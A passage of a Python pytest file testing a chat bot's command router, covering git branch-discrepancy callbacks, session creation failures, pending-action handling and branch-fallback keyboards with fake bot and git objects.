    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:stored",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        effective_user=SimpleNamespace(language_code="en"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer(): return None
    async def fake_edit(text, reply_markup=None): edited.append(text)
    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    assert edited
    assert "pending" in edited[-1].lower() or "decision" in edited[-1].lower()


def test_branch_discrepancy_callback_wrong_kind_sends_error(tmp_path: Path):
    (tmp_path / "backend").mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    # Set pending action with wrong branch_resolution kind
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {"kind": "switch_source"},  # not "discrepancy"
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:stored",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        effective_user=SimpleNamespace(language_code="en"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer(): return None
    async def fake_edit(text, reply_markup=None): edited.append(text)
    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    assert edited


def test_branch_discrepancy_callback_choose_current_updates_branch(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "my-session", "backend", "codex", branch_name="stored-branch")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "continue",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "stored-branch",
            "current_branch": "current-branch",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:current",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        effective_user=SimpleNamespace(language_code="en"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer(): return None
    async def fake_edit(text, reply_markup=None): edited.append(text)
    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state.get("current_branch") == "current-branch"


def test_branch_discrepancy_callback_stored_unavailable_no_fallback(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "my-session", "backend", "codex", branch_name="ghost-branch")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "continue",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "ghost-branch",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=[],   # ghost-branch not available locally
        # no remote either
    )

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:stored",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        effective_user=SimpleNamespace(language_code="en"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer(): return None
    async def fake_edit(text, reply_markup=None): edited.append((text, reply_markup))
    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    assert edited


# ===========================================================================
# session_lifecycle_commands.py: null result when workspace lock is held
# ===========================================================================


def test_create_session_returns_false_when_workspace_locked(tmp_path: Path):
    """_create_session_for_context must return False (not crash) when
    _run_with_typing returns None because the workspace lock is already held."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    # Patch _run_with_typing to return None (simulates workspace lock held)
    async def _locked(*args, **kwargs):
        return None

    router._run_with_typing = _locked

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._create_session_for_context(
        update, context,
        session_name=None,
        use_session_id_as_name=False,
        provider="codex",
        project_folder="backend",
        branch_name="",
        project_path=backend,
    ))

    assert result is False


async def _acquire_lock_helper():
    import asyncio
    lock = asyncio.Lock()
    await lock.acquire()
    return lock


# ===========================================================================
# session_branch_resolution.py — _resolve_branch_discrepancy_if_needed paths
# ===========================================================================


def test_resolve_discrepancy_clears_action_when_no_active_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {"kind": "discrepancy", "stored_branch": "a", "current_branch": "b"},
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))

    assert result is False
    assert store.get_chat_state("bot-a", 123).get("pending_action") is None


def test_resolve_discrepancy_clears_action_when_session_not_dict(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {"kind": "discrepancy", "stored_branch": "a", "current_branch": "b"},
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    # Remove the session entry while keeping active_session_id pointing to it
    import json, portalocker
    lock = cfg.state_file.with_suffix(cfg.state_file.suffix + ".lock")
    with portalocker.Lock(str(lock), timeout=5):
        raw = json.loads(cfg.state_file.read_text())
        raw["chats"]["bot-a:123"]["sessions"].pop("sess1", None)
        cfg.state_file.write_text(json.dumps(raw))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))

    assert result is False


def test_resolve_discrepancy_sends_error_when_project_folder_missing(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "gone-folder", "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {"kind": "discrepancy", "stored_branch": "a", "current_branch": "b"},
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))

    assert result is False
    assert bot.messages  # Error message was sent


def test_resolve_discrepancy_prompts_when_kind_is_discrepancy(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "my-session", "backend", "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature-x",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))

    assert result is False
    # A prompt message should have been sent
    assert bot.messages


# ===========================================================================
# session_branch_resolution.py — _multi_branch_source_keyboard paths
# ===========================================================================


def test_multi_branch_source_keyboard_returns_none_when_no_branches_available(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, local_branches=[])

    result = router._multi_branch_source_keyboard(
        new_branch="feature",
        source_branches=["nonexistent"],
        project_path=backend,
    )

    assert result is None


def test_multi_branch_source_keyboard_skips_empty_branch_names(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, local_branches=["main"])

    result = router._multi_branch_source_keyboard(
        new_branch="feature",
        source_branches=["", "main"],
        project_path=backend,
    )

    assert result is not None
    labels = [btn.text for row in result.inline_keyboard for btn in row]
    assert any("main" in lbl for lbl in labels)


# ===========================================================================
# session_branch_resolution — _offer_branch_source_fallback
# ===========================================================================


def test_offer_branch_source_fallback_shows_keyboard_when_alternatives_exist(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="main",
        local_branches=["main"],
    )

    edited = []
    query = SimpleNamespace(
        answer=None,
        edit_message_text=None,
    )

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.edit_message_text = fake_edit

    result = asyncio.run(router._offer_branch_source_fallback(
        query,
        project_folder="backend",
        project_path=backend,
        source_kind="origin",
        source_branch="deleted-branch",
        new_branch="feature",
        error_message="fatal: not found",
    ))

    assert result is True
    assert edited


def test_offer_branch_source_fallback_returns_false_for_local_source(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    result = asyncio.run(router._offer_branch_source_fallback(
        None,
        project_folder="backend",
        project_path=backend,
        source_kind="local",   # only origin triggers fallback
        source_branch="branch",
        new_branch="feature",
        error_message="error",
    ))

    assert result is False


# ===========================================================================
# session_lifecycle_commands.py — _resolve_session_prerequisites paths
# ===========================================================================


def test_resolve_session_prerequisites_returns_none_when_provider_unavailable(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_provider("bot-a", 123, "codex")
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def unavailable(*a, **kw):
        return False

    router._ensure_provider_available = unavailable

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_session_prerequisites(update, context, pending_action=None))
    assert result is None


def test_resolve_session_prerequisites_returns_none_when_no_branch_and_git_repo(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_provider("bot-a", 123, "codex")
    store.set_current_project_folder("bot-a", 123, "backend")
    # No branch set in state
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, local_branches=["main"])

    async def available(*a, **kw):
        return True

    router._ensure_provider_available = available

    sent_messages = []

    async def fake_send_branch_prompt(*a, **kw):
        sent_messages.append("branch_prompt")

    router._send_branch_selection_prompt = fake_send_branch_prompt

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_session_prerequisites(update, context, pending_action=None))
    assert result is None
    assert "branch_prompt" in sent_messages


# ===========================================================================
# session_lifecycle_commands.py — _create_session_for_context error paths
# ===========================================================================


def test_create_session_returns_false_when_agent_reports_failure(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    failed_result = SimpleNamespace(success=False, session_id=None, error_message="agent error")

    async def _failing(*args, **kwargs):
        return failed_result

    router._run_with_typing = _failing

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._create_session_for_context(
        update, context,
        session_name=None,
        use_session_id_as_name=False,
        provider="codex",
        project_folder="backend",
        branch_name="main",
        project_path=backend,
    ))

    assert result is False
    assert any("agent error" in m for m in bot.messages)


# ===========================================================================
# session_lifecycle_commands.py — _continue_pending_action paths
# ===========================================================================


def test_continue_pending_action_clears_empty_user_message(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_provider("bot-a", 123, "codex")
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_pending_action("bot-a", 123, {"kind": "message", "user_message": ""})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def available(*a, **kw):
        return True

    router._ensure_provider_available = available

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._continue_pending_action(update, context))
    assert result is False
    assert store.get_chat_state("bot-a", 123).get("pending_action") is None


def test_continue_pending_action_handles_unknown_kind(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_provider("bot-a", 123, "codex")
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_pending_action("bot-a", 123, {"kind": "unknown_kind"})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def available(*a, **kw):
        return True

    router._ensure_provider_available = available

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._continue_pending_action(update, context))
    assert result is False
    assert store.get_chat_state("bot-a", 123).get("pending_action") is None


# ===========================================================================
# session_lifecycle_commands.py — _ensure_active_session_ready_for_run paths
# ===========================================================================


def test_ensure_active_session_ready_returns_false_when_no_active_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    assert result is False


def test_ensure_active_session_ready_returns_false_project_folder_missing(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "gone", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    assert result is False
    assert bot.messages  # error message sent


def test_ensure_active_session_ready_returns_true_non_git_repo(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    assert result is True


def test_ensure_active_session_ready_prompts_branch_discrepancy(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex", branch_name="feature-x")
    store.set_pending_action("bot-a", 123, {"kind": "message", "user_message": "hi"})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    assert result is False
    assert bot.sent_messages  # discrepancy prompt sent


# ===========================================================================
# session_branch_resolution — handle_branch_discrepancy_callback paths
# ===========================================================================


def test_handle_branch_discrepancy_callback_shows_no_pending_when_none(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    edited = []

    async def fake_answer():
        pass

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query = SimpleNamespace(answer=fake_answer, edit_message_text=fake_edit, data="branchdiscrepancy:stored")
    update = SimpleNamespace(effective_chat=SimpleNamespace(id=123, type="private"), message=None, callback_query=query)
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert any("pending" in t.lower() or edited for t in edited)


def test_handle_branch_discrepancy_callback_shows_wrong_kind_message(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Set pending action with wrong kind
    store.set_pending_action("bot-a", 123, {"kind": "message", "user_message": "hi"})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    edited = []

    async def fake_answer():
        pass

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query = SimpleNamespace(answer=fake_answer, edit_message_text=fake_edit, data="branchdiscrepancy:stored")
    update = SimpleNamespace(effective_chat=SimpleNamespace(id=123, type="private"), message=None, callback_query=query)
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited


def test_handle_branch_discrepancy_callback_stored_no_branches_keyboard_none(tmp_path: Path):
    """Stored branch chosen but local+remote unavailable and no fallback keyboard."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex", branch_name="feature-x")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature-x",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # No branches → keyboard will be None
    # No local branches, no default branch → keyboard will be None for source fallback
    router.git = FakeGitManager(is_git_repo=True, local_branches=[], current_branch=None, default_branch=None)

    edited = []

    async def fake_answer():
        pass

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query = SimpleNamespace(answer=fake_answer, edit_message_text=fake_edit, data="branchdiscrepancy:stored")
    update = SimpleNamespace(effective_chat=SimpleNamespace(id=123, type="private"), message=None, callback_query=query)
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    # Should show "no fallback" message (no keyboard available)
    assert edited
    assert any("no longer available" in t[0].lower() or "no fallback" in t[0].lower() for t in edited)


def test_handle_branch_discrepancy_callback_stored_branch_found_locally(tmp_path: Path):
    """Stored branch chosen and it exists locally/remotely → show restore method keyboard."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex", branch_name="feature-x")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature-x",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        local_branches=["feature-x", "main"],
        current_branch="main",
        default_branch="main",
    )

    edited = []

    async def fake_answer():
        pass

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query = SimpleNamespace(answer=fake_answer, edit_message_text=fake_edit, data="branchdiscrepancy:stored")
    update = SimpleNamespace(effective_chat=SimpleNamespace(id=123, type="private"), message=None, callback_query=query)
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    # Should show keyboard with restore options
    assert edited
    assert any(t[1] is not None for t in edited)


def test_handle_branch_discrepancy_callback_current_choice(tmp_path: Path):
    """Choosing 'current' updates store and continues pending action."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex", branch_name="feature-x")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature-x",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, local_branches=["main"], current_branch="main")

    continued = []

    async def fake_continue(*a, **kw):
        continued.append(True)

    router._continue_pending_action = fake_continue

    edited = []

    async def fake_answer():
        pass

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query = SimpleNamespace(answer=fake_answer, edit_message_text=fake_edit, data="branchdiscrepancy:current")
    update = SimpleNamespace(effective_chat=SimpleNamespace(id=123, type="private"), message=None, callback_query=query)
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited
    assert continued


def test_handle_branch_discrepancy_callback_no_active_session(tmp_path: Path):
    """Callback chosen but no active session → shows no_active_session message."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature-x",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    edited = []

    async def fake_answer():
        pass

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query = SimpleNamespace(answer=fake_answer, edit_message_text=fake_edit, data="branchdiscrepancy:stored")
    update = SimpleNamespace(effective_chat=SimpleNamespace(id=123, type="private"), message=None, callback_query=query)
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited


def test_handle_branch_discrepancy_callback_project_folder_missing(tmp_path: Path):
    """Callback chosen but project folder is gone → shows missing message."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "gone-folder", "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature-x",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    edited = []

    async def fake_answer():
        pass

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query = SimpleNamespace(answer=fake_answer, edit_message_text=fake_edit, data="branchdiscrepancy:stored")
    update = SimpleNamespace(effective_chat=SimpleNamespace(id=123, type="private"), message=None, callback_query=query)
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited


# ===========================================================================
# session_branch_resolution — _resolve_branch_discrepancy_if_needed early exits
# ===========================================================================


def test_resolve_discrepancy_returns_true_when_no_pending_action(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


def test_resolve_discrepancy_returns_true_when_no_branch_resolution(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_pending_action("bot-a", 123, {"kind": "message", "user_message": "hi"})  # no branch_resolution key
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


def test_resolve_discrepancy_returns_true_when_branch_resolution_not_dict(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_pending_action("bot-a", 123, {"kind": "message", "user_message": "hi", "branch_resolution": "invalid"})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


def test_resolve_discrepancy_returns_true_when_unknown_kind(tmp_path: Path):
    """branch_resolution dict with unknown kind → returns True (no action)."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {"kind": "other"},
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


def test_resolve_discrepancy_returns_true_for_empty_stored_or_current_branch(tmp_path: Path):
    """branch_resolution discrepancy but with empty stored/current branch → True."""
    backend = tmp_path / "backend"
    backend.mkdir()
